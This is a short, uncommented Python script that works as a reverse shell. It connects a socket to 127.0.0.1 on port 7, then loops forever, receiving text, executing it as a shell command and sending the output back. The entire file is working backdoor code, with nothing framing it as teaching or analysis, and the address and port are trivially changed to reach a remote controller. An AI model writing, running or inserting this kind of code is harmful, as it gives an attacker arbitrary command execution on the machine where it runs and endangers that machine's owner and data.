import socket
import subprocess
import os
sock=socket.socket()
sock.connect(("127.0.0.1",7))
print("successful")
while True:
    recv_cmd=sock.recv(1024)
    output=subprocess.getoutput(recv_cmd)
    sock.send(output.encode())